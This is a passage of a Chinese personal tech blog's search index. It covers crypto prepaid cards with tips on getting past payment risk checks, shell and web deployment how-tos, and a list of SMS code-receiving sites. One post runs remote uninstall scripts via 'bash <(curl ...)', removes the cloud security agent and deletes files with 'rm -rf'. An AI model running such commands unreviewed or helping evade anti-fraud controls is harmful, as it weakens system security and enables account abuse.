$this-&gt;nodeInfo-&gt;server_name, &#x27;up_mbps&#x27; =&gt; $this-&gt;nodeInfo-&gt;up_mbps, &#x27;down_mbps&#x27; =&gt; $this-&gt;nodeInfo-&gt;down_mbps, &#x27;obfs&#x27; =&gt; Helper::getServerKey($this-&gt;nodeInfo-&gt;created_at, 16) ]; break; &#125;&#125; 后记 这是个不完善的 shell，所以有问题也是正常的。如果不爽，自己去改去完善。 为了这个脚本能称心如意，站长特意去钻研了 jq，有兴趣的可以参考：常用 linux jq 命令语法整理","categories":[{"name":"混X圈","slug":"混X圈","permalink":"https://sobaigu.com/categories/%E6%B7%B7X%E5%9C%88/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"币圈必备：可以消费 USDC/USDT 的预付信用卡 - OneKey Card","slug":"mastercad-visa-pay-with-usd-usdc-onekey","date":"2023-05-12T10:39:59.000Z","updated":"2024-09-16T01:51:44.000Z","comments":true,"path":"mastercad-visa-pay-with-usd-usdc-onekey.html","permalink":"https://sobaigu.com/mastercad-visa-pay-with-usd-usdc-onekey.html","excerpt":"","text":"之前介绍过一款 可以消费 USDT 的虚拟信用卡，支持微信线上购物和支付宝线下小额扫码，但随着用户基数扩大，加之阿麦利卡收紧银行监管，一些数字货币资产也随之列为高风险来源，导致 Dupay/Depay 不定期不可用状态或者低限额，推荐同时备着这个同类型虚拟信用卡 OneKey Card「本币消费只有充值手续费，额度高」。 简介 真遗憾，站长认为最靠谱之一的 USDT 消费卡也扛不住了，将于2024年9月30日下线，寄希望 Dupay/Depay 能争口气续命 OneKey Card 是硬件冷钱包厂商推出的一款虚拟信用卡「官网显示即将有实体卡」，首次开卡默认卡等级为 白银，支持 USDT 和 USDC 1:1 充值入金，直接消费 USD 爽歪歪，中国大陆区支持支付宝、微信、拼夕夕、美团等 CNY 消费场景。 现阶段新开卡消费时需要货币转换费，本币消费只有充值手续费，适合 ChatGPT Plus 订阅，openAI付费，国外买服务器域名等直接消费 USD 应用 卡片类型 Visa MasterCard 卡段 428836 556150 国家/地区 美国 印度 结算费用 USD（对美国商户的美元交易免收手续费，其他交易类型的费率为 1% + $0.5） 和 Depay 相比，整体大同小异，有多地区卡可选择，优选美国卡支持 openAI、ChatGPT Plus、GooglePlay、Amazon 等付款，不想作为主力也可以注册一个作为 Plan B，美元消费无手续费。 注册认证 打开 官网注册页 「打不开就上梯子」，点击 【sign in with Google】，用 Google 的账号授权登录。 OneKey Card 注册激活时填入邀请码：KKKSV5，遇到问题或者有疑问的欢迎评论交流 注册完成后，首先会要求进行认证完成账户激活，按页面提示用微信或浏览器扫码完成一段活体录像认证。 地区选香港，即可用大陆身份证或护照完成KYC 地区选香港，即可用大陆身份证或护照完成KYC 地区选香港，即可用大陆身份证或护照完成KYC 激活后，为了账号安全，需要开启谷歌验证码二次认证，安卓谷歌验证器推荐一个免费开源的 Aegis，使用教程就懒得写了，直接贴 墙内教程，自行去下载安装使用，iOS 可以参考 OneKey官方帮助中心，或者自行安装对应APP解决。 充值 USDT/USDC 并兑换 USD 实名认证完成后，点击【Top Up/充值】进行钱包充值，注意选择对应的链别充错了，公测阶段需要 20 USD 以上，建议宁多勿少。 充值到钱包的 USDT/USDC 还需要兑换成 USD 才能划转到预付费卡进行消费： 添加卡片 充值完成后，回到账户主页，点击左上角 Wallet/钱包 下拉添加卡片，根据您的使用场景选择需要开通的卡片： 输入从钱包划转到消费卡的金额，点击 添加卡片 完成开卡： 开卡完成后，点击 【CVV/安全码】，通过二次安全验证后可以查看卡片所有信息。 绑卡消费 不管线上还是线下支付需要商家使用的 POS 机支持相应通道（Visa 或 Master），仅支持银联将无法支付。 绑定支付宝 打开支付宝，点击我的》银行卡 点击添加银行卡》输入开通的卡号 输入 姓名、日期、安全码 绑定完成 绑定微信 打开微信，点击【我】&gt;【服务】》点击【钱包】 点击【银行卡】》点击 【添加银行卡】》输入支付密码 输入 OneKey Card 卡号 添加银行卡信息，账单地址信息根据自己实际情况填写 点击下一步，完成绑定 消费场景的要求 线下场景：使用微信支付，要看商家使用的POS机是否支持VISA通道，仅支持银联的那种是不行的。（即使支持微信支付，也不一定支持对应卡的通道） 线上场景：主要是看平台风控的要求，有些账户信誉好、消费频繁等等可能会允许使用，但是有些账户如果风险比较高的话会被风控拒绝。这个是线上商家使用的收单工具和风控的严松决定的。所以：建议慢慢养卡，首笔别用来充话费之类的虚拟物，后面就越用就越顺！ 常见问题 费用包含哪些？ 以初始银卡为例：充值手续费/法币转换费 2.1% + 月费 1 USD，明面上无其他费用（实际上非本币消费时会额外产生货币转换费，以开卡时显示为准）。 公测期月费 0 USD，充值手续费 1.95% 支持哪些充值/入金途径？ 以下列出的链可能部分还未支持，以官方充值页面实际支持为准。 币种 网络 USDC Avalanche C-Chain、Polygon、Tron、Ethereum、Algorand、valanche、Flow USDT（即将支持） Avalanche、Polygon、Tron、Ethereum Ethereum 链转账手续费那叫一个贵（每笔大约11刀），建议用 Avalanche C-Chain（每笔0.8刀）、Polygon、Tron，没有现货的话可以在交易所币币交易后选择对应的链提币，可以看到对应的提币转账手续费。 OneKey Card 支持哪些支付场景？ 支付渠道 详情 支付宝 小额订单消费无需额外手续费；超过200元，支付宝收取3%手续费 淘宝 绑卡消费，任何金额都会收取 3% 手续费（系淘宝收取） 微信支付 京东、拼多多无额外手续费 美团 1. 绑定后每次点外卖需要另外输入CVV和有效日期 2. 如果提示暂不支持该银行，直接在下一步输入CVV和有效日期即可 当前支付的非中国大陆银行卡存在被盗风险，本次交易暂无法完成 正如前面提到的建议要养卡。首次使用如果出现风控，可以联系支付渠道客服申诉，跟客服说明情况，无法绑卡或者无法支付，提交 OneKey Card 首页截图，重点是理直气壮告知是本人的虚拟卡，详见官方说明。 其他更多请见 官方帮助常见问题 本文关键词 消费USDT，USDC信用卡，数字货币信用卡，虚拟币出金卡，虚拟币支付，U币消费卡，ChatGPT会员订阅，openAI付费，美元信用卡 解决的问题： 交易所赚的 U币/虚拟货币 怎么安全兑换法币使用？ USDT/USDC 怎么安全出金？ USDT/USDC 怎么用于消费？ 去哪搞支持 ChatGPT 会员订阅的外币信用卡？ openAI 付费被拒绝这么办？ 虚拟信用卡哪家好？ USDT/USDC 怎么兑换才不会被冻卡？ 虚拟币支付怎么使用？","categories":[{"name":"混X圈","slug":"混X圈","permalink":"https://sobaigu.com/categories/%E6%B7%B7X%E5%9C%88/"}],"tags":[{"name":"虚拟币","slug":"虚拟币","permalink":"https://sobaigu.com/tags/%E8%99%9A%E6%8B%9F%E5%B8%81/"}]},{"title":"shell中的一些特殊字符用法知识","slug":"shell-special-symbols","date":"2023-04-24T03:25:24.000Z","updated":"2023-04-24T03:25:32.000Z","comments":true,"path":"shell-special-symbols.html","permalink":"https://sobaigu.com/shell-special-symbols.html","excerpt":"","text":"前言 shell越用越强大，一些特殊字符特殊用法比较难记，好记性不如烂笔头，网上摘抄的，留一份日后学习。很多事情其实是可以很好的处理的，一些小东西还是没必要引入python代码，直接shell自身就可以处理完成。 $&#123;[#%]&#125; 获取文件名和后缀名 12345# f=file.tar.gz# echo $&#123;f##*.&#125;gz# echo $&#123;f%%.*&#125;file 假设我们定义了一个变量为： 1file=/dir1/dir2/dir3/my.file.txt 可以用 $&#123;&#125; 分别替换得到不同的值： $&#123;file#*/&#125;：删掉第一个 / 及其左边的字符串：dir1/dir2/dir3/my.file.txt $&#123;file##*/&#125;：删掉最后一个 / 及其左边的字符串：my.file.txt $&#123;file#*.&#125;：删掉第一个 . 及其左边的字符串：file.txt $&#123;file##*.&#125;：删掉最后一个 . 及其左边的字符串：txt $&#123;file%/*&#125;：删掉最后一个 / 及其右边的字符串：/dir1/dir2/dir3 $&#123;file%%/*&#125;：删掉第一个 / 及其右边的字符串：空值 $&#123;file%.*&#125;：删掉最后一个 . 及其右边的字符串：/dir1/dir2/dir3/my.file $&#123;file%%.*&#125;：删掉第一个 . 及其右边的字符串：/dir1/dir2/dir3/my 记忆的方法为： # 是去掉左边（键盘上 # 在 $ 的左边，从左向右删） % 是去掉右边（键盘上 % 在 $ 的右边，从右向左删） 单一符号是最小匹配；两个符号是最大匹配 参考文档 shell编程：冒号后面跟等号，加号，减号，问号的意义 Shell 中的特殊字符","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"Bootstrap菜单自动收缩隐藏","slug":"bootstrap-navbar-hide-after-scroll-click","date":"2023-03-21T09:34:37.000Z","updated":"2023-03-21T09:34:37.000Z","comments":true,"path":"bootstrap-navbar-hide-after-scroll-click.html","permalink":"https://sobaigu.com/bootstrap-navbar-hide-after-scroll-click.html","excerpt":"","text":"前言 有个姐姐找过来说，她的网站在手机界面下，点开导航菜单后，如果不再次点菜单按钮，导航弹出层就一直杵在那，有点不正常。 学艺不精，三脚猫功夫以为这是 Bootstrap 某个样式没有应用，可翻来翻去都没发现有滚动屏幕或点击其他区域自动收缩隐藏的功能。Google 后也有人有同样的疑问，说是原来点击菜单链接后菜单不自动收缩居然也是正常的Bootstrap 逻辑，有点不可思议。 现象 从上图可知，该导航菜单浮层存在以下问题： 屏幕滚动不会自动收缩 点击导航链接后不会自动收缩 点击导航菜单外的空白区域不会自动收缩 解决 原导航菜单代码： 123456789101112131415161718192021222324&lt;header class=&quot;nav-down responsive-nav hidden-lg hidden-md&quot;&gt; &lt;!-- navbutton for mobile --&gt; &lt;button type=&quot;button&quot; id=&quot;nav-toggle&quot; class=&quot;navbar-toggle collapsed navbar-nav&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#main-nav&quot;&gt; &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;!--/.navbar-header--&gt; &lt;div id=&quot;main-nav&quot; class=&quot;collapse navbar-collapse&quot;&gt; &lt;nav&gt; &lt;ul class=&quot;nav navbar-nav&quot;&gt; &lt;li&gt;&lt;a href=&quot;#top&quot;&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#featured&quot;&gt;Biography&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#projects&quot;&gt;Photo Gallery&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#video&quot;&gt;Media&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#blog&quot;&gt;Upcoming Events&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#contact&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;/div&gt;&lt;/header&gt; 添加以下代码： 123456789101112131415&lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; $(window).scroll(function () &#123; $(&quot;.navbar-nav a&quot;).click(function () &#123; $(&quot;#main-nav&quot;).prop(&#x27;class&#x27;, &#x27;navbar-collapse collapse&#x27;); &#125;); $(window).scroll(function () &#123; $(&quot;#main-nav&quot;).prop(&#x27;class&#x27;, &#x27;navbar-collapse collapse&#x27;); &#125;); &#125;); $(document).click(function () &#123; $(&quot;#main-nav&quot;).prop(&#x27;class&#x27;, &#x27;navbar-collapse collapse&#x27;); &#125;);&lt;/script&gt; 修改后效果再次盗图： 参考文档 在小屏幕和手机屏幕下，Bootstrap导航栏的自动折叠隐藏","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"币圈必备：可以消费 USDT 的预付信用卡 - Dupay/Depay","slug":"mastercad-visa-pay-with-usd-usdt","date":"2023-03-12T10:39:59.000Z","updated":"2024-09-27T21:51:48.000Z","comments":true,"path":"mastercad-visa-pay-with-usd-usdt.html","permalink":"https://sobaigu.com/mastercad-visa-pay-with-usd-usdt.html","excerpt":"","text":"简介 Dupay（原名Depay） 虚拟信用卡「实际上是预付卡」支持 USDT「TRC20，Polygon，Bep20」加密货币充值，内置英镑、欧元和美元电子账户，可自由进行英镑、欧元、美元等法定货币与 USDT 的交易和转账，很好地解决了加密货币与法币之间的出金入金问题，杜绝传统加密货币出金遇黑钱冻卡现象，畅享无国界电子货币支付。 Dupay（原名Depay） 是华人在英国开的公司做的产品，为个人解决加密货币多场景应用，国内支持微信，支付宝，美团等消费 注册申请信用卡 注册申请没门槛，只需要简单几步就完成： 先 点此去注册「邀请码/推荐人ID：359733，打不开就上梯子」一个账号，建议使用邮箱注册 注册完照提示安装 iOS 或 Android 端 APP 打开 APP，首先往 USDT 钱包地址里充币 支持 USDT（选择支持的TRC20，Polygon，Bep20等链） 充值需＞5 USDT 才会入账 首次激活开卡需要＞10 USD 所需USDT消耗：交易所提币手续费 + USDT 开卡费 + USDT 兑 USD 磨损 + 充值 USD 到卡手续费 综上，建议充值到Dupay钱包 50USDT 以上 在 APP 上按自己的需求申请对应等级信用卡，综合考量建议直接开通白金等级，申请 MasterCard 或 Visa 如果不是开 Lite 等级卡，需要完成 KYC，按照指示一步一步完成流程，只需几分钟系统自动完成 开完卡后，需要从钱包里将 USDT 兑换成美元充进卡里面才能看到对应卡号 不要向任何人暴露你的卡号，一些地方可以直接使用卡号小额消费，不验证 CVV 英镑借记卡 MasterCard Lite 标准 高级 白金 黑金 KYC费用（USDT） / 5 5 5 / 开卡费（USDT） / 0 10 50 / 月费（GBP） / 1 0.5 0 / 卡片充值费用 / 1.80% 1.60% 1.40% / 卡片额度/月（GBP） / 5000 10000 200000 / 消费手续费 / 0.50% 0.50% 0.50% / 美元预付卡 MasterCard Lite 标准 高级 白金 黑金 KYC No Yes Yes Yes Yes 开卡费（USDT） 30 0 20 50 / 月费（USD） 2 1 0.5 0 0 卡片充值费用 2.50% 1.80% 1.60% 1.40% 1.20% 卡片额度/月（USDT） 5000 20000 50000 200000 / Visa Lite 标准 高级 白金 黑金 KYC No Yes Yes Yes Yes 开卡费（USDT） 30 0 10 50 / 月费（USD） 2 1 0.5 0 0 卡片充值费用 2.50% 1.80% 1.60% 1.40% 1.20% 卡片额度/月（USDT） 5000 20000 50000 200000 / 费用总结 Dupay 卡除去一次性开卡费，在日常使用中主要包含以下费用： 转币磨损：从 USDT 兑换成 USD 过程中，实际不是 1:1 兑换，此处磨损 1%+，也就是转入 100 USDT，实际兑换到卡里为 99- USD 充值费：如上表所示，兑换成 USD 后，需要充值到虚拟卡才能作为消费金额，此处按对应百分比收取 月费：如上表所示，每个月初从虚拟卡余额中扣取相应美元，余额不足会欠账，下次有余额则一次性划扣，官方称欠费超半年自动销卡 汇兑滑点：如果非 USD 消费，可以发现并不是实时汇率，CNY 消费大约会比当期汇率低 1%+ 综上，以 MasterCard 高级等级卡为例，日常 USDT 使用费率大约为 3%，在同类卡中费率相对低位。 消费场景 此美元外币预付信用卡在国内人民币支付场景中，可绑定微信和支付宝（支付宝200以上收3%手续费）、京东，支持京东购物、中石化/中石油加油卡、美团外卖、滴滴打车、Paypal、天猫国际版、Q币充值、拼夕夕、猫眼电影票赛事、唯品会等知名交易服务，但线下商超支持的机会不多，所以存在不完美的地方。 Dupay MasterCard 支持绑定支付宝、微信支付、美团外卖、拼夕夕、Paypal (国区、美区、港区)、天猫国际版等等 支持Stripe商户、google play 商店、youtube premium、Paypal 商户、美区苹果商店、和支持非3DS卡的电商网站 支持国内苹果官网直接绑卡购买iphone和mac，可能会打电话问询，直接说即可 暂不支持苹果支付 APPLE PAY 和 Google PAY 支持 ChatGPT PLUS 会员扣费，需要你的支付环境，IP最好是原生IP(不一定要美国IP)，如果不行开无痕模式+全局模式切换IP多试几次 所有等级的卡（Lite、标准、高级、白金、黑金）都满足以上场景 FAQ Dupay如何绑定支付宝、美团、微信支付？ 先往卡里充钱再绑定！先充钱再绑定！先充钱再绑定！ 绑定支付宝跟添加其他银行卡一样，输入卡号，过期日期（月/年）、CVV即可 绑定微信支付跟添加其他银行卡一样，输入卡号，过期日期（月/年）、CVV即可 绑定美团支付，先绑定国内一张银行卡，关闭美团急速支付，然后下订单时候付款时候，切换付款方式，选择国际卡支付，添加 Dupay 的卡片号码信息即可每次点外卖时候需要输入 CVV 验证 账单地址全部填写国内实际地址即可 可以绑定美区 appstore，如果绑定不了切换美国IP在尝试一下，账单地址填写美国的最好，还是不行的话联系苹果官方客服，声明这个是美国虚拟卡。 Dupay绑定支付宝微信失败，或者使用时候失败怎么办？ 支付宝绑定失败，或者支付失败，请在支付宝界面联系在线人工客服「非人工发的那个入口一般都打不开」，告知存着的问题，然后根据客服要求操作，上传Dupay APP首页截图等解封即可。 微信绑定失败，或者支付失败怎么办，找到微信客服进行申诉，一般也是上传 Dupay APP 首页截图解决（注意文字说明 Dupay APP 截图上有你个人的拼音名字，客服有时候瞎看不到）,一直申诉不行，一直给差评，直到有客服打你电话或者你自己去打微信客服电话95017，说清楚这个是你的卡，有你的名字 美团无法支付？美团找客服解决，话术是：我自己的虚拟卡，我朋友都可以用 所有的解决风控问题，都是明确这是虚拟卡，这是你本人的，不是盗刷的，理直气壮一点 为什么会风控，怎么避免风控？ 这个是海外银行卡，国内支付工具一开始就把风险等级提高 绑定成功的第一笔消费不能消费虚拟产品，比如充值手机话费 可以在大商家内消费，比如KFC，肯德基微信小程序消费 不能一来直接刷大额，或者超过卡片余额的超额消费 支付宝和微信慢慢正常使用养卡，单次消费金额会越来越大 先充值再使用，可以省去很多麻烦，钱不够去刷触发商家风控后，以后你再充值可能都用不了了 Dupay日常使用建议 支付宝：适合线下被扫描抢扫，也可以自己扫商家二维码使用，日常线下买菜几乎适合所有的商家（注意不要频繁扫商家支付大额），超过200元需要支付3%手续费（支付宝收） 微信：适合在京东购物，拼夕夕购物，没有额外手续，线下二维码商家基本不支持（测试罗森便利店，永辉超市支持） 美团，适合点外卖，随便点；如果提示暂不支持该银行，直接选择，进行下一步输入过期日期和CVV，就支持了 京东、拼夕夕、淘宝 在购买部分虚拟商品和海外商品时 不支持此卡支付 淘宝上和拼夕夕直接绑卡消费，无论多少金额都要收3%手续费 这是一张消费卡，日常消费使用，不要老想套现，不科学，容易被风控 本文关键词 消费USDT，USDC信用卡，数字货币信用卡，虚拟币出金卡，虚拟币支付，U币消费卡，ChatGPT会员订阅，openAI付费，美元信用卡 解决的问题： 交易所赚的 U币/虚拟货币 怎么安全兑换法币使用？ USDT/USDC 怎么安全出金？ USDT/USDC 怎么用于消费？ 去哪搞支持 ChatGPT 会员订阅的外币信用卡？ openAI 付费被拒绝这么办？ 虚拟信用卡哪家好？ USDT/USDC 怎么兑换才不会被冻卡？ 虚拟币支付怎么使用？","categories":[{"name":"混X圈","slug":"混X圈","permalink":"https://sobaigu.com/categories/%E6%B7%B7X%E5%9C%88/"}],"tags":[{"name":"虚拟币","slug":"虚拟币","permalink":"https://sobaigu.com/tags/%E8%99%9A%E6%8B%9F%E5%B8%81/"}]},{"title":"阿里云VPS净化处理","slug":"vps-purge-aliyun-service","date":"2023-03-06T10:39:59.000Z","updated":"2023-03-06T10:39:59.000Z","comments":true,"path":"vps-purge-aliyun-service.html","permalink":"https://sobaigu.com/vps-purge-aliyun-service.html","excerpt":"","text":"前言 默认购买的阿里云VPS都自带一个 aliyundun 和 aliyun-service，名字叫阿里云盾（安骑士），实质上是用来监控VPS是否安全，自动扫描进程、查杀病毒，会连接阿里云的漏洞扫描机，它会定期探测VPS是否存在已知漏洞。 这些，对咱其实没卵用，发现漏洞不花钱也修不了。24小时在后台扫描服务器硬盘，装点啥东西还都得让马云审阅一遍，想想就有点不舒服。 卸载清理掉才是最佳选择。 删除清理 运行以下命令卸载并清理： 1234567# 卸载阿里云盾（安骑士）bash &lt;(curl -sSL http://update.aegis.aliyun.com/download/uninstall.sh)bash &lt;(curl -sSL http://update.aegis.aliyun.com/download/quartz_uninstall.sh)# 删除残留文件pkill aliyun-servicerm -fr /etc/init.d/agentwatch /usr/sbin/aliyun-servicerm -rf /usr/local/aegis* 卸载后可以查看自己云服务器进程，已经没有了 AliYunDun、aliyun-service、AliYunDunUpdate 三项表示净化完成。 以前的文章 阿里云服务器Windows系统设置 阿里云服务器新开必做的几件事","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Gunicorn + Nginx 项目自动启动方案","slug":"gunicorn-nginx-starter-online","date":"2023-02-28T06:09:50.000Z","updated":"2023-02-28T06:09:50.000Z","comments":true,"path":"gunicorn-nginx-starter-online.html","permalink":"https://sobaigu.com/gunicorn-nginx-starter-online.html","excerpt":"","text":"前言 刚接触一个开源项目，用 Gunicorn 作为启动及 Web 服务程序，初次接触，整理了些资料，实现：项目自启动 + nginx 作为前端 Web服务，以备后用。 Gunicorn 简介 Gunicorn（Green Unicorn）是一个用于 UNIX 的 Python WSGI HTTP 服务器。Gunicorn 服务器广泛兼容各种 Web 框架，实现简单，服务器占用资源少，速度相当快。 Gunicorn 没有依赖项，因此下载后可以很容易迁移到生产环境。 安装 1pip install gunicorn 快速使用 直接在项目目录内，也就是 manage.py 所在的目录内执行： 1gunicorn your_project.wsgi:application --bind 0.0.0.0:8080 即可启动生产级别的 Web 服务，前提是你的项目也是生产环境的配置，例如 Debug = False。 方案组合 一般服务器上都装有 nginx，所以就用 nginx 反代到后端项目提供服务， 使用 systemd 监控管理 Gunicorn Gunicorn 和 nginx 之间监听指定端口或用 Unix sock 通讯「推荐nginx 的 conf 文件中 不用代理 ip:prot 形式，而是代理 sock 文件。」 根据以上罗列方案组合，需要建立以下文件： 系统服务管理：/etc/systemd/system/gunicorn.service 系统级别的套接字文件：/etc/systemd/system/gunicorn.socket nginx 的网站配置：/etc/nginx/conf.d/domain.conf 系统服务管理：/etc/systemd/system/gunicorn.service 1234567891011121314151617181920212223242526[Unit]Description=Gunicorn daemonRequires=gunicorn.socketAfter=network.target[Service]User=wwwGroup=www# WorkingDirectory 是项目路径目录WorkingDirectory=/www/wwwroot/domain.com# ExecStart=/www/wwwroot/domain.com/venv/bin/gunicorn \\# --access-logfile - \\# --workers 3 \\# --bind unix:/run/gunicorn.sock \\# myproject.wsgi:application# 使用配置代替执行命令中的各种参数# 原本在虚拟环境中要执行的 gunicorn -c gunicorn_conf.py main:app -k uvicorn.workers.UvicornWorker# 其中 gunicorn 和 gunicorn_conf.py 要写完整的路径名称ExecStart=/www/wwwroot/domain.com/venv/bin/gunicorn -c /www/wwwroot/domain.com/gunicorn_conf.py main:app -k uvicorn.workers.UvicornWorkerExecReload=/bin/kill -s HUP $MAINPIDKillMode=mixedTimeoutStopSec=5PrivateTmp=true[Install]WantedBy=multi-user.target 系统级别的套接字文件：/etc/systemd/system/gunicorn.socket 12345678[Unit]Description=Gunicorn socket[Socket]ListenStream=/run/gunicorn.sock[Install]WantedBy=sockets.target 这样我们就可以在系统启动的时候启动 Gunicorn 服务，也可以很方面的启动、停止、重启 Gunicorn 。 1234systemctl enable gunicornsystemctl start gunicornsystemctl stop gunicornsystemctl restart gunicorn 查看服务状态： 1systemctl status gunicorn.socket gunicorn_conf.py 为了后期更改方便，将 Gunicorn 参数写进配置文件： 1234567891011121314151617181920212223242526272829303132333435363738# 根据项目实际情况引入库# coding=utf-8# from gevent import monkey# monkey.patch_all()# import multiprocessing# 生产环境记得关闭debugdebug = True# 修改代码时自动重启reload = Truereload_engine = &#x27;inotify&#x27;# //绑定与Nginx通信的端口# bind = &#x27;127.0.0.1:3002&#x27;bind = &#x27;unix:/run/gunicorn.sock&#x27; #与 /etc/systemd/system/gunicorn.socket 中对应pidfile = &#x27;log/gunicorn.pid&#x27;# workers = 4 # 进程数workers = multiprocessing.cpu_count() * 2 + 1 #进程数# worker_class = &#x27;uvicorn.workers.UvicornWorker&#x27; # 使用 unicorn ,不使用 gunicorn 自带的方式. unicorn相关文档: http://www.uvicorn.org/deployment/#running-gunicorn-worker# 日志级别# debug:调试级别，记录的信息最多；# info:普通级别；# warning:警告消息；# error:错误消息；# critical:严重错误消息；loglevel = &#x27;debug&#x27;# 访问日志路径accesslog = &#x27;log/gunicorn_access.log&#x27;# 错误日志路径errorlog = &#x27;log/gunicorn_error.log&#x27;# 设置gunicorn访问日志格式，错误日志无法设置.貌似无效access_log_format = &#x27;%(t)s %(p)s %(h)s &quot;%(r)s&quot; %(s)s %(L)s %(b)s %(f)s&quot; &quot;%(a)s&quot;&#x27;# 启动命令# gunicorn -c gunicorn_conf.py main:app# gunicorn -c gunicorn_conf.py main:app -k uvicorn.workers.UvicornWorker 实测使用 supervisor 守护进程常规方式无法启动，各种报错 nginx 的网站配置：domain.conf 1234567891011121314server &#123; listen 80; server_name server_domain_or_IP; location = /favicon.ico &#123; access_log off; log_not_found off; &#125; location /static/ &#123; root /www/wwwroot/domain.com; &#125; location / &#123; include proxy_params; proxy_pass http://unix:/run/gunicorn.sock; &#125;&#125; nginx -t 测试配置是否有误，nginx -s reload 重载配置让配置生效 Nginx 和 Gunicorn 故障排除 对于故障排除，日志可以帮助找到根本原因。检查以下日志可以帮助排除故障： 查看 Nginx 进程日志：journalctl -u nginx 查看 Nginx 访问日志：less /var/log/nginx/access.log 检查 Nginx 错误日志：less /var/log/nginx/error.log 检查 Gunicorn 应用程序日志：journalctl -u gunicorn 检查 Gunicorn 套接字日志：journalctl -u gunicorn.socket 参考文档 官方文档：Deploying Gunicorn nginx+gunicorn+fastapi 部署自动后台启动 使用 nginx + gunicorn 来部署生产环境的 Django app django 部署，gunicorn、virtualenv、nginx","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"手机短信接码验证码打码平台列表","slug":"platform-for-verify-code","date":"2023-02-12T03:33:44.000Z","updated":"2023-02-12T03:33:57.000Z","comments":true,"path":"platform-for-verify-code.html","permalink":"https://sobaigu.com/platform-for-verify-code.html","excerpt":"别人整理的资源列表，平时撸活动需要用到，用处多多，至于怎么用就看各位的能力了。 本页信息仅作资料收藏用，所载第三方链接可能会失效，内容发生变更等，本站对其功能及使用产生的所有后果不承担任何责任，请自行斟酌","text":"别人整理的资源列表，平时撸活动需要用到，用处多多，至于怎么用就看各位的能力了。 本页信息仅作资料收藏用，所载第三方链接可能会失效，内容发生变更等，本站对其功能及使用产生的所有后果不承担任何责任，请自行斟酌 短信验证码平台 请点击以下标题链接打开相应接码平台 SMS-ACTIVATE 最近比较火的接码平台，平台号码较多 支持openAI，TG，Wechat，AlibabaCloud等注册接码 有中文页面 支持微信、支付宝、银联银行卡充值 老虎接码 据说是大平台5多年运营，热门冷门，量大量小都可接，按收到的验证码扣费。有API，有免费版，欧洲免费号。 SMS-MAN 平台主营俄罗斯接码和号码租用，有近180个国家号码可选，有中文，美国英国荷兰实卡注册tg，WhatsApp，贝宝，亚马逊，Facebook 支持支付宝充值 有电脑客户端 有很多国家的号码，支持的项目也很多，有中国、香港号码，有部分国内项目（微信、抖音、阿里巴巴、支付宝、微博、百度） SMS-BUS 海外接码平台，拥有20多个国家号码资源，全平台号码超40万。可接 Telegram, Line, TikTok, Google, Yahoo, Microsoft, Vinted, PayPal, Shopee 等60多个项目。 价格实惠，Telegram 接码低至1元。 中文客服，支持支付宝和 USDT 充值（3美金起充），不来码不要钱，支持 API，可生成 url 接码链接供合作伙伴分销 richpva 提供接码注册服务，微信，qq，飞机，抖音，京东，脸书，推特，飞机ws，tinder，gmail，instagram等国内外业务每日大量更新！充值支持微信，支付宝，USDT,等各种充值方式。 有微信，支付宝充值（发卡站购买卡密）。充值5元起步 无法二次接码，接收短信的时间在1分钟到3分钟之间。 SMSReceiveFree 国人运营的接码平台，有中国号和美国号。 Free Online Phone 美加英免费接码，号码比较少 语音验证码平台 暂无，欢迎联系站长推荐 扩展阅读 如何注册其他国家的微博账号？ sms-man接码如何利用API获取号码？ 接码平台合集","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"手机","slug":"手机","permalink":"https://sobaigu.com/tags/%E6%89%8B%E6%9C%BA/"}]},{"title":"GitHub 怎么用 token 连接登录","slug":"github-verfy-with-token","date":"2022-12-19T02:09:19.000Z","updated":"2022-12-19T02:09:19.000Z","comments":true,"path":"github-verfy-with-token.html","permalink":"https://sobaigu.com/github-verfy-with-token.html","excerpt":"","text":"前言 一直用的好好的仓库，突然某一天提交的时候就死活连接认证失败了。之前知道 GitHub 取消了密码认证，可咱一直用的是 RSA 密钥啊。 以为换个 ed25519 密钥就能万事大吉，结果一样认证失败，提示 timeout 和没权限。经 ssh -Tv git@github.com 测试，新生成的密钥是能认证的，一时竟不知错在哪儿。 现象 仓库是用的 ssh:// 远程地址，Git 操作仓库提示连接超时，上梯子也不行，配置 443 端口也同样的问题： 12345ssh: connect to host github.com port 22: Connection timed outfatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists. 如果是用账号密码登录，那么将会有如下提示： 123remote: Support for password authentication was removed on August 13, 2021. Please use a personal 